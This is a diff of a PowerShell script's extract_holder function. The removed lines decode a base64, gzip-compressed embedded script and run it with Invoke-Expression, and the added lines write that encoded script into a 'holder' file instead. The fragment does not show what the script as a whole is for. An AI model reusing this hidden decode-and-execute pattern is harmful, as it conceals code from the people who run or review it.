@@ -10,29 +10,28 @@ function checkFolder {
     }
 }
 
-
 function extract_holder()
 {
     $holderFile = Get-HolderPath
     if ([string]::IsNullOrEmpty($EncodedScript) -eq $false)
     {
-        $content = @"
-        `$EncodedScript = `"$EncodedScript`"
-        
-        `$CompressedBytes = [Convert]::FromBase64String(`$EncodedScript)
-        `$MemoryStream = New-Object System.IO.MemoryStream(, `$CompressedBytes)
-        `$GzipStream = New-Object System.IO.Compression.GzipStream(`$MemoryStream, [System.IO.Compression.CompressionMode]::Decompress)
-        `$StreamReader = New-Object System.IO.StreamReader(`$GzipStream, [System.Text.Encoding]::UTF8)
-        `$data = `$StreamReader.ReadToEnd()
-        `$DecodedScript = "
-"@  
-        $content = $content + "`$EncodedScript + `$EncodedScript + [Environment]::NewLine + `$data"
-        
-        $content = $content + "Invoke-Expression `$DecodedScript"
-
-
+        $content = '
+###dynamic
+'
+        $DoubleQuote = [char]34
+        $DollarSign = [char]36
+        $sb = New-Object System.Text.StringBuilder
+        [void]$sb.Append($DollarSign)
+        [void]$sb.Append("EncodedScript =")
+        [void]$sb.Append($DoubleQuote)
+        [void]$sb.Append($EncodedScript)
+        [void]$sb.Append($DoubleQuote)
+        [void]$sb.AppendLine("")
+        [void]$sb.AppendLine($content)
+        $content = $sb.ToString()
+        [System.IO.File]::WriteAllText($holderFile, $content)
         writedbg "extract_holder encodedScript"
-        Set-Content -Path $holderFile -Value $content 
+
         return
     }
     $curScript = Get-ScriptPath
